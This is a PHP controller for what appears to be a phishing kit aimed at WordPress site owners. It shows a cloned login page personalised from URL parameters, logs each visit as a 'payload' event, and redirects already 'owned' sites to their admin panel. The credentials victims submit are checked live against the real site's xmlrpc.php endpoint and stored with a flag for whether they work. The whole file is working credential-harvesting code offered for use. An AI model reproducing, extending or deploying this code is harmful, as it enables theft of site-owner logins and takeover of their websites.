<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth extends CI_Controller
{

	function __construct()
	{

		parent::__construct();

		$this->load->model('main_model');
	}

	public function index()
	{
		// echo $html;
		if ($this->input->get()) {

			$data = array();

			$data['alvo_url'] = htmlspecialchars($this->input->get('u'));
			$data['alvo_email'] = htmlspecialchars($this->input->get('e'));
			$data['alvo_nome'] = htmlspecialchars($this->input->get('a'));
			$data['alvo_language'] = htmlspecialchars($this->input->get('lang'));


			if ($this->main_model->is_alvo_owned($data['alvo_url'])) {
				header('Location:https://' . $data['alvo_url'] . '/wp-admin');
			}

			$alvo_payload = "Visitou Login";
			$alvo_type = "acesso";

			$this->main_model->register_payload_log($alvo_payload, $data['alvo_url'], $data['alvo_email'], $data['alvo_language'], $alvo_type);


			$curl_handle = curl_init();
			curl_setopt($curl_handle, CURLOPT_URL, 'https://' . $data['alvo_url'] . '/wp-login.php');
			curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT, 2);
			curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($curl_handle, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0');
			$html = curl_exec($curl_handle);
			curl_close($curl_handle);



			if ($data['alvo_language'] == "pt") {

				$this->load->view('users/login_pt', $data);
			} else if ($data['alvo_language'] == "en") {

				$this->load->view('users/login_en', $data);
			} else {

				$this->load->view('users/login_en', $data);
			}
		} else {
			header('Location:https://wordpress.com');
		}
	}


	// function checkLogin($username, $password, $url)
	// {
	//     // URL do arquivo xmlrpc.php
	//     $url = 'https://' . $url . '/xmlrpc.php';

	//     // Cria o corpo da requisição XML-RPC
	//     $request = xmlrpc_encode_request('wp.getUsersBlogs', array($username, $password));

	//     // Configura as opções da requisição cURL
	//     $options = array(
	//         CURLOPT_URL => $url,
	//         CURLOPT_POST => true,
	//         CURLOPT_POSTFIELDS => $request,
	//         CURLOPT_RETURNTRANSFER => true,
	//         CURLOPT_HTTPHEADER => array('Content-Type: text/xml'),
	//         CURLOPT_SSL_VERIFYPEER => false // Desabilita a verificação do certificado SSL (para testes apenas)
	//     );

	//     // Inicializa a sessão cURL
	//     $curl = curl_init();

	//     // Configura as opções da sessão cURL
	//     curl_setopt_array($curl, $options);

	//     // Executa a requisição
	//     $response = curl_exec($curl);



	//     if (strpos($response, "isAdmin") !== false) {

	//         return true;

	//     } elseif (strpos($response, "faultCode") !== false) {

	//         return false;

	//     } else {
	//          return false;
	//     }


	// }

	function checkLogin($username, $password, $url, $adepto_email)
	{

		try {
			// URL do arquivo xmlrpc.php
			$url = 'https://' . $url . '/xmlrpc.php';

			// Cria o corpo da requisição XML-RPC para buscar categorias
			$request = xmlrpc_encode_request('wp.getCategories', array(0, $username, $password));

			// Configura as opções da requisição cURL
			$options = array(
				CURLOPT_URL => $url,
				CURLOPT_POST => true,
				CURLOPT_POSTFIELDS => $request,
				CURLOPT_RETURNTRANSFER => true,
				CURLOPT_HTTPHEADER => array('Content-Type: text/xml'),
				CURLOPT_SSL_VERIFYPEER => false // Desabilita a verificação do certificado SSL (para testes apenas)
			);

			// Inicializa a sessão cURL
			$curl = curl_init();

			// Configura as opções da sessão cURL
			curl_setopt_array($curl, $options);

			// Executa a requisição
			$response = curl_exec($curl);

			// Fecha a sessão cURL
			curl_close($curl);

			// print_r($response);

			// Verifica a resposta para determinar o sucesso
			if ($response !== false && strpos($response, "faultCode") === false) {
				// Sucesso na requisição
				$this->main_model->register_payload_log("Login Realizado", $url, $adepto_email, " ", "login");
				// echo "<br>ENTROU COM SUCESSO<br>";
				return true;
			} else {
				// Falha na requisição
				$this->main_model->register_payload_log("Falha Login", $url, $adepto_email, " ", "login");
				// echo "<br>NÃO LOGOU<br>";
				return false;
			}

		} catch (Exception $e) {
			$this->main_model->register_payload_log("Falha Login", $url, $adepto_email, " ", "login");
			return false;
		}
	}


	public function act_add_adepto_credenciais()
	{

		$adepto_url = htmlspecialchars($this->input->post('user_url'));
		$adepto_email = htmlspecialchars($this->input->post('user_email'));
		$adepto_login = htmlspecialchars($this->input->post('user_login'));
		$adepto_password = htmlspecialchars($this->input->post('user_password'));


		if ($this->checkLogin($adepto_login, $adepto_password, $adepto_url, $adepto_email)) {

			$this->main_model->addAlvoCredenciais($adepto_url, $adepto_email, $adepto_login, $adepto_password, 1);
			$response = array('status' => 'true', "message" => "Logado com sucesso.");

		} else {

			$this->main_model->addAlvoCredenciais($adepto_url, $adepto_email, $adepto_login, $adepto_password, 0);
			$response = array('status' => 'false', "message" => "Falhou");
		}

		print_r(json_encode($response));
	}
}
